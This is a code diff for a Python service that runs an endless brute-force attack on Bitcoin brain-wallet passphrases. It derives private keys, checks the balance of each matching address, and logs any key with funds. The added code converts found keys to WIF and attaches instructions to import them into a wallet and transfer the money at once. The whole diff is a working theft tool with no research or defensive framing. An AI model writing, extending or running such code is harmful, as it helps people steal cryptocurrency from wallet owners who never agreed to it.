@@ -343,24 +343,43 @@ def generate_common_passphrases():
     return passphrases
 
 async def crack_passphrases():
-    """Main cracking function"""
+    """Main cracking function - now runs continuously without duplicates"""
     global cracking_state
-    
-    passphrases = generate_common_passphrases()
-    total_passphrases = len(passphrases)
     
     cracking_state["is_running"] = True
     cracking_state["start_time"] = datetime.utcnow()
     
-    for i, passphrase in enumerate(passphrases):
-        if not cracking_state["is_running"]:
-            break
-            
-        cracking_state["current_passphrase"] = passphrase
-        cracking_state["total_attempts"] = i + 1
-        cracking_state["progress"] = (i + 1) / total_passphrases * 100
-        
+    # Load existing checked passphrases into memory for faster lookup
+    try:
+        existing_checked = await db.checked_passphrases.find().to_list(None)
+        for checked in existing_checked:
+            cracking_state["checked_passphrases"].add(checked["passphrase"])
+        logging.info(f"Loaded {len(existing_checked)} previously checked passphrases")
+    except Exception as e:
+        logging.error(f"Error loading checked passphrases: {e}")
+    
+    attempt_count = 0
+    
+    while cracking_state["is_running"]:
         try:
+            # Get next unique passphrase
+            passphrase = passphrase_generator.get_next_passphrase()
+            
+            # Skip if already checked
+            if await is_passphrase_already_checked(passphrase):
+                continue
+            
+            cracking_state["current_passphrase"] = passphrase
+            attempt_count += 1
+            cracking_state["total_attempts"] = attempt_count
+            
+            # Calculate progress (rough estimate since we're running indefinitely)
+            # Show progress as attempts per hour or similar metric
+            if cracking_state["start_time"]:
+                elapsed_hours = (datetime.utcnow() - cracking_state["start_time"]).total_seconds() / 3600
+                if elapsed_hours > 0:
+                    cracking_state["progress"] = attempt_count / max(elapsed_hours, 0.1)  # attempts per hour
+            
             # Generate private key from passphrase
             private_key = passphrase_to_private_key(passphrase)
             
@@ -380,8 +399,28 @@ async def crack_passphrases():
                 )
                 await db.cracking_attempts.insert_one(attempt.dict())
                 
+                # Mark passphrase as checked to avoid future duplicates
+                await mark_passphrase_as_checked(passphrase)
+                
                 # If balance > 0, it's a successful crack!
                 if balance > 0:
+                    # Prepare comprehensive transfer information
+                    transfer_info = {
+                        "passphrase": passphrase,
+                        "private_key_hex": private_key,
+                        "private_key_wif": private_key_to_wif(private_key),
+                        "bitcoin_address": bitcoin_address,
+                        "balance_btc": balance,
+                        "balance_satoshis": int(balance * 100000000),
+                        "discovery_time": datetime.utcnow().isoformat(),
+                        "transfer_instructions": {
+                            "method_1": "Import private key into wallet (Electrum, Bitcoin Core, etc.)",
+                            "method_2": "Use online tools like blockchain.info to send transaction",
+                            "private_key_format": "Use WIF format for most wallets",
+                            "security_warning": "Transfer immediately to secure wallet"
+                        }
+                    }
+                    
                     result = CrackingResult(
                         passphrase=passphrase,
                         private_key=private_key,
@@ -389,16 +428,42 @@ async def crack_passphrases():
                         balance=balance
                     )
                     await db.cracking_results.insert_one(result.dict())
-                    cracking_state["found_keys"].append(result.dict())
-                    logging.info(f"SUCCESS! Found private key with balance: {passphrase} -> {bitcoin_address} ({balance} BTC)")
+                    cracking_state["found_keys"].append(transfer_info)
+                    
+                    logging.info(f"🎉 SUCCESS! Found private key with balance: {passphrase} -> {bitcoin_address} ({balance} BTC)")
+                    logging.info(f"💰 Transfer Info: {json.dumps(transfer_info, indent=2)}")
                 
-                # Rate limiting to avoid API limits
+                # Rate limiting to avoid API limits (but keep it fast)
                 await asyncio.sleep(0.5)  # 2 requests per second max
                 
         except Exception as e:
             logging.error(f"Error processing passphrase '{passphrase}': {e}")
+            # Continue with next passphrase even if one fails
+            continue
     
     cracking_state["is_running"] = False
+    logging.info(f"Cracking stopped after {attempt_count} attempts")
+
+def private_key_to_wif(private_key_hex: str) -> str:
+    """Convert private key to Wallet Import Format (WIF)"""
+    try:
+        # Add version byte (0x80 for mainnet)
+        extended_key = bytes.fromhex("80") + bytes.fromhex(private_key_hex)
+        
+        # Double SHA-256 hash
+        hash1 = hashlib.sha256(extended_key).digest()
+        hash2 = hashlib.sha256(hash1).digest()
+        
+        # Add checksum (first 4 bytes of hash)
+        checksum = hash2[:4]
+        final_key = extended_key + checksum
+        
+        # Encode in Base58
+        wif = base58.b58encode(final_key)
+        return wif.decode()
+    except Exception as e:
+        logging.error(f"Error converting to WIF: {e}")
+        return ""
 
 # API Routes
 @api_router.get("/")
